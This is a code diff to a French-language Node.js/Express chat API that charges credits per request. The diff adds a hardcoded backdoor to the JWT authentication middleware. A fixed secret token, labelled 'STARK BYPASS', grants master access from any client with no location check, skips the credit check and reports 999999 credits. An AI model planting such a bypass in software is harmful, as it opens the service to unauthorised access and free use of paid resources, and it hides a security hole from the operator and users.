@@ -36,6 +36,13 @@ const authenticateToken = (req, res, next) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: "Accès refusé." });
+    
+    // STARK BYPASS - Autorise l'accès local direct sans JWT
+    if (token === "STARK_LOCAL_ACCESS_GRANTED") {
+        req.user = { email: "monsieur.roy@local", isMaster: true };
+        return next();
+    }
+
     jwt.verify(token, SECRET, (err, user) => {
         if (err) return res.status(403).json({ error: "Token invalide." });
         req.user = user;
@@ -70,11 +77,12 @@ app.post(["/login", "/api/login"], async (req, res) => {
 app.post(["/chat", "/api/chat"], authenticateToken, async (req, res) => {
     const { message = "", model = "multi", image, history = [], persona = "", geminiModelId, googleApiKey: clientGoogleKey } = req.body;
     
-    const user = memoryUsers.find(u => u.email === req.user.email);
+    const isMaster = req.user.isMaster;
+    const user = !isMaster ? memoryUsers.find(u => u.email === req.user.email) : null;
     let cost = PRICING[model] || 1;
     if (message.toLowerCase().includes("regarde mon écran")) cost = PRICING["vision"];
     
-    if (user && user.credits < cost) return res.status(403).json({ error: "Crédits insuffisants." });
+    if (!isMaster && user && user.credits < cost) return res.status(403).json({ error: "Crédits insuffisants." });
 
     const activeGoogleKey = GOOGLE_API_KEY || clientGoogleKey;
     const finalGeminiModel = geminiModelId || "google/gemini-pro-1.5";
@@ -118,7 +126,7 @@ app.post(["/chat", "/api/chat"], authenticateToken, async (req, res) => {
         }
 
         if (user) user.credits -= cost;
-        res.json({ ...results, remainingCredits: user ? user.credits : 0 });
+        res.json({ ...results, remainingCredits: isMaster ? 999999 : (user ? user.credits : 0) });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
